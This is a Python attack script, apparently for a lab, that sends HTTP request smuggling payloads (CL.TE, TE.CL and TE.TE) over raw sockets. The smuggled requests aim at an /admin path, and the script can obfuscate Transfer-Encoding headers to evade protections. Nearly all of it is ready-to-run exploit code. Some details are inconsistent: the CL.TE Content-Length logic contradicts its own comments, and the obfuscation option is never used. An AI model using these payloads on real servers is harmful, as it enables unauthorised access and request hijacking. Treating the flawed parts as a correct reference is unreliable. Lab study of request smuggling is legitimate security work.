#!/usr/bin/env python3
"""
HTTP Request Smuggling Attack Tool for Lab Environment
Author: dw0rf
Date: May 14, 2025

This tool is designed to demonstrate various HTTP Request Smuggling attacks
in a controlled lab environment. It can perform CL.TE, TE.CL, and TE.TE attacks.
"""

import argparse
import socket
import time
import sys
import os
import json
import logging
from rich.console import Console
from rich.table import Table
from rich.progress import Progress
from rich.logging import RichHandler

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format="%(message)s",
    datefmt="[%X]",
    handlers=[RichHandler(rich_tracebacks=True)]
)
logger = logging.getLogger("smuggler")

# Set up rich console
console = Console()

class HTTPSmuggler:
    """Main class for HTTP Request Smuggling attacks"""
    
    def __init__(self, target_host, target_port, timeout=10):
        self.target_host = target_host
        self.target_port = target_port
        self.timeout = timeout
        self.results = []
        
    def connect(self):
        """Create a raw socket connection to the target"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target_host, self.target_port))
            return sock
        except Exception as e:
            logger.error(f"Connection error: {e}")
            return None

    def send_raw_request(self, payload):
        """Send a raw HTTP request payload over a socket"""
        sock = self.connect()
        if not sock:
            return None
            
        response = b""
        try:
            sock.sendall(payload.encode())
            
            # Receive the response
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
        except socket.timeout:
            logger.warning("Socket timeout while receiving data")
        except Exception as e:
            logger.error(f"Error during request: {e}")
        finally:
            sock.close()
            
        return response
        
    def send_raw_request_wait_for_second(self, payload, wait_time=1):
        """
        Send a request and wait for a specific amount of time before sending a second request
        This helps in detecting time-based vulnerabilities or waiting for the first request to be processed
        """
        sock = self.connect()
        if not sock:
            return None
            
        try:
            # Send the first request
            sock.sendall(payload.encode())
            
            # Wait for specified time
            time.sleep(wait_time)
            
            # Send a second normal request on the same connection
            normal_request = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(self.target_host)
            sock.sendall(normal_request.encode())
            
            # Receive response
            response = b""
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
                
            return response
        except Exception as e:
            logger.error(f"Error in two-stage request: {e}")
        finally:
            sock.close()
            
        return None

    def perform_clte_attack(self, smuggled_path="/admin"):
        """
        Perform a CL.TE (Content-Length.Transfer-Encoding) HTTP Request Smuggling attack
        
        In this attack, the front-end server uses the Content-Length header while
        the back-end server uses the Transfer-Encoding header, allowing requests to be smuggled.
        """
        console.print("[bold blue]Performing CL.TE Attack...[/bold blue]")
        
        # First part: Normal request with a crafted Content-Length
        # Second part: Smuggled request that will be processed by the backend
        smuggled_request = f"GET {smuggled_path} HTTP/1.1\r\nHost: {self.target_host}\r\n\r\n"
        
        # The main exploit - we craft a payload where:
        # 1. The Content-Length says the first request is longer than it actually is
        # 2. The Transfer-Encoding chunked encoding is used, but the frontend ignores it
        # 3. The backend processes the transfer encoding and thinks the first request ends
        #    earlier, leading it to interpret the remainder as a new request
        payload = (
            "POST / HTTP/1.1\r\n"
            f"Host: {self.target_host}\r\n"
            "Content-Length: {}\r\n"  # Will be formatted with actual length
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            f"{smuggled_request}"
        )
        
        # Calculate the Content-Length value
        # We need it to be long enough to include the "0\r\n\r\n" part but not the smuggled request
        content_length = len("0\r\n\r\n")
        
        # Format the payload with the calculated Content-Length
        payload = payload.format(content_length)
        
        console.print(f"[cyan]Sending payload:[/cyan]\n")
        console.print(payload.replace("\r\n", "\\r\\n\n"))
        
        # Send the attack payload
        start_time = time.time()
        response = self.send_raw_request(payload)
        end_time = time.time()
        
        # Process and display the result
        if response:
            response_str = response.decode('utf-8', errors='ignore')
            status_line = response_str.split("\r\n")[0] if "\r\n" in response_str else "Unknown status"
            
            result = {
                "attack_type": "CL.TE",
                "payload": payload,
                "response_status": status_line,
                "response_length": len(response),
                "time": end_time - start_time,
                "successful": "/admin" in response_str or "403 Forbidden" in response_str
            }
            
            self.results.append(result)
            
            console.print(f"[green]Response received ({len(response)} bytes):[/green]")
            console.print(f"Status: {status_line}")
            console.print(f"Elapsed time: {end_time - start_time:.2f} seconds")
            
            if result["successful"]:
                console.print("[bold green]Attack appears successful! Smuggled request detected.[/bold green]")
            
            return result
        else:
            console.print("[bold red]No response received![/bold red]")
            return None

    def perform_tecl_attack(self, smuggled_path="/admin"):
        """
        Perform a TE.CL (Transfer-Encoding.Content-Length) HTTP Request Smuggling attack
        
        In this attack, the front-end server uses the Transfer-Encoding header while
        the back-end server uses the Content-Length header, allowing requests to be smuggled.
        """
        console.print("[bold blue]Performing TE.CL Attack...[/bold blue]")
        
        # The smuggled request we want the backend to process
        smuggled_request = f"GET {smuggled_path} HTTP/1.1\r\nHost: {self.target_host}\r\n\r\n"
        
        # Craft the payload where:
        # 1. Transfer-Encoding is used with a non-standard variant that the frontend understands
        #    but the backend doesn't (e.g., with a space after "chunked")
        # 2. The backend uses Content-Length and processes the request differently
        payload = (
            "POST / HTTP/1.1\r\n"
            f"Host: {self.target_host}\r\n"
            f"Content-Length: {len(smuggled_request) + 11}\r\n"  # +11 for the chunked encoding parts
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            f"{len(smuggled_request):x}\r\n"  # Length of smuggled request in hex
            f"{smuggled_request}\r\n"
            "0\r\n"
            "\r\n"
        )
        
        console.print(f"[cyan]Sending payload:[/cyan]\n")
        console.print(payload.replace("\r\n", "\\r\\n\n"))
        
        # Send the attack payload
        start_time = time.time()
        response = self.send_raw_request(payload)
        end_time = time.time()
        
        # Process and display the result
        if response:
            response_str = response.decode('utf-8', errors='ignore')
            status_line = response_str.split("\r\n")[0] if "\r\n" in response_str else "Unknown status"
            
            result = {
                "attack_type": "TE.CL",
                "payload": payload,
                "response_status": status_line,
                "response_length": len(response),
                "time": end_time - start_time,
                "successful": "/admin" in response_str or "403 Forbidden" in response_str
            }
            
            self.results.append(result)
            
            console.print(f"[green]Response received ({len(response)} bytes):[/green]")
            console.print(f"Status: {status_line}")
            console.print(f"Elapsed time: {end_time - start_time:.2f} seconds")
            
            if result["successful"]:
                console.print("[bold green]Attack appears successful! Smuggled request detected.[/bold green]")
            
            return result
        else:
            console.print("[bold red]No response received![/bold red]")
            return None

    def perform_tete_attack(self, smuggled_path="/admin"):
        """
        Perform a TE.TE (Transfer-Encoding.Transfer-Encoding) HTTP Request Smuggling attack
        
        In this attack, both servers use the Transfer-Encoding header but parse it differently,
        allowing for request smuggling.
        """
        console.print("[bold blue]Performing TE.TE Attack...[/bold blue]")
        
        # The smuggled request we want the backend to process
        smuggled_request = f"GET {smuggled_path} HTTP/1.1\r\nHost: {self.target_host}\r\n\r\n"
        
        # Craft the payload where:
        # 1. We use multiple Transfer-Encoding headers with different casing or obfuscation
        # 2. One server might honor the first or the last or one but not the other
        payload = (
            "POST / HTTP/1.1\r\n"
            f"Host: {self.target_host}\r\n"
            "Content-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Transfer-Encoding: identity\r\n"
            "\r\n"
            "1\r\n"
            "A\r\n"
            "0\r\n"
            "\r\n"
            f"{smuggled_request}"
        )
        
        console.print(f"[cyan]Sending payload:[/cyan]\n")
        console.print(payload.replace("\r\n", "\\r\\n\n"))
        
        # For TE.TE attacks, we often need to make a follow-up request to trigger
        # the processing of the smuggled request
        start_time = time.time()
        response = self.send_raw_request_wait_for_second(payload, wait_time=2)
        end_time = time.time()
        
        # Process and display the result
        if response:
            response_str = response.decode('utf-8', errors='ignore')
            status_line = response_str.split("\r\n")[0] if "\r\n" in response_str else "Unknown status"
            
            result = {
                "attack_type": "TE.TE",
                "payload": payload,
                "response_status": status_line,
                "response_length": len(response),
                "time": end_time - start_time,
                "successful": "/admin" in response_str or "403 Forbidden" in response_str
            }
            
            self.results.append(result)
            
            console.print(f"[green]Response received ({len(response)} bytes):[/green]")
            console.print(f"Status: {status_line}")
            console.print(f"Elapsed time: {end_time - start_time:.2f} seconds")
            
            if result["successful"]:
                console.print("[bold green]Attack appears successful! Smuggled request detected.[/bold green]")
            
            return result
        else:
            console.print("[bold red]No response received![/bold red]")
            return None
    
    def obfuscate_headers(self, original_payload, technique="space"):
        """Add obfuscation to headers to bypass certain protections"""
        if technique == "space":
            # Add spaces after the header name
            return original_payload.replace("Transfer-Encoding:", "Transfer-Encoding: ")
        elif technique == "tab":
            # Use tab instead of space
            return original_payload.replace("Transfer-Encoding:", "Transfer-Encoding:\t")
        elif technique == "case":
            # Mix case
            return original_payload.replace("Transfer-Encoding:", "TrAnSfEr-EnCoDiNg:")
        elif technique == "line":
            # Line wrapping in header
            return original_payload.replace("Transfer-Encoding: chunked", 
                                           "Transfer-Encoding:\r\n chunked")
        return original_payload
        
    def display_results_table(self):
        """Display a summary table of attack results"""
        table = Table(title="HTTP Request Smuggling Attack Results")
        
        table.add_column("Attack Type", style="cyan")
        table.add_column("Response Status", style="green")
        table.add_column("Response Size", style="blue")
        table.add_column("Time (s)", style="magenta")
        table.add_column("Success", style="bold")
        
        for result in self.results:
            table.add_row(
                result["attack_type"],
                result["response_status"],
                str(result["response_length"]),
                f"{result['time']:.2f}",
                "✅" if result["successful"] else "❌"
            )
            
        console.print(table)
    
    def save_results(self, filename="attack_results.json"):
        """Save attack results to a JSON file"""
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=4)
        
        console.print(f"[green]Results saved to {filename}[/green]")

def main():
    parser = argparse.ArgumentParser(description="HTTP Request Smuggling Attack Tool")
    parser.add_argument("--host", default="frontend", help="Target host (default: frontend)")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--path", default="/admin", help="Path to use in smuggled request (default: /admin)")
    parser.add_argument("--timeout", type=int, default=10, help="Socket timeout in seconds (default: 10)")
    parser.add_argument("--save", action="store_true", help="Save results to JSON file")
    parser.add_argument("--verbose", "-v", action="store_true", help="Enable verbose output")
    parser.add_argument("--attack", choices=["clte", "tecl", "tete", "all"], default="all",
                       help="Attack type to perform (default: all)")
    parser.add_argument("--obfuscate", choices=["space", "tab", "case", "line", "none"], default="none",
                       help="Header obfuscation technique (default: none)")
    
    args = parser.parse_args()
    
    # Set logging level based on verbosity
    if args.verbose:
        logger.setLevel(logging.DEBUG)
    
    # Create the smuggler instance
    smuggler = HTTPSmuggler(args.host, args.port, args.timeout)
    
    console.print(f"[bold]HTTP Request Smuggling Lab - Attack Client[/bold]")
    console.print(f"Target: [cyan]{args.host}:{args.port}[/cyan]")
    console.print(f"Smuggled path: [cyan]{args.path}[/cyan]")
    
    with Progress() as progress:
        task = progress.add_task("[green]Running attacks...", total=3 if args.attack == "all" else 1)
        
        # Run the selected attack(s)
        if args.attack == "clte" or args.attack == "all":
            smuggler.perform_clte_attack(args.path)
            progress.update(task, advance=1)
            
        if args.attack == "tecl" or args.attack == "all":
            smuggler.perform_tecl_attack(args.path)
            progress.update(task, advance=1)
            
        if args.attack == "tete" or args.attack == "all":
            smuggler.perform_tete_attack(args.path)
            progress.update(task, advance=1)
    
    # Display results table
    if smuggler.results:
        smuggler.display_results_table()
        
        # Save results if requested
        if args.save:
            smuggler.save_results()
    else:
        console.print("[bold red]No attack results to display![/bold red]")

if __name__ == "__main__":
    main()